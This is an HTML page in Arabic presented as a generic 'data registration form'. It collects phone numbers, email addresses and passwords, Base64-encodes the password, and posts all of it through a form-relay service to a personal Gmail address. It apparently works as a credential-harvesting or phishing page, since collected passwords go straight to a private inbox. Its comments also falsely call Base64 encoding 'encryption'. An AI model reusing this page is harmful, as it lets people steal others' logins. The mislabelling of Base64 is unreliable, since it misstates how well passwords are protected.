<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>نموذج إرسال البيانات - تشفير Base64</title>
  <style>
    body {
      font-family: 'Arial';
      text-align: center;
      padding: 40px;
      background-color: #f1f1f1;
    }
    form {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
      direction: rtl;
    }
    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <h2>نموذج تسجيل البيانات</h2>

  <form id="formBase64" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
    
    <!-- رقم الهاتف -->
    <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>

    <!-- البريد الإلكتروني -->
    <input type="email" name="البريد_الإلكتروني" placeholder="البريد الإلكتروني" required>

    <!-- كلمة المرور الأصلية -->
    <input type="password" id="rawPassword" placeholder="كلمة المرور" required>

    <!-- كلمة المرور المشفرة (Base64) -->
    <input type="hidden" name="كلمة_المرور_المشفرة" id="encodedPassword">

    <!-- منع سبام -->
    <input type="text" name="_honey" style="display:none">

    <!-- إعادة التوجيه بعد الإرسال -->
    <input type="hidden" name="_redirect" value="thanks.html">

    <button type="submit">إرسال</button>
  </form>

  <script>
    document.getElementById("formBase64").addEventListener("submit", function(e) {
      e.preventDefault();
      const raw = document.getElementById("rawPassword").value;
      const encoded = btoa(raw); // تشفير Base64
      document.getElementById("encodedPassword").value = encoded;
      document.getElementById("rawPassword").disabled = true; // منع الإرسال الأصلي
      this.submit();
    });
  </script>

</body>
</html>
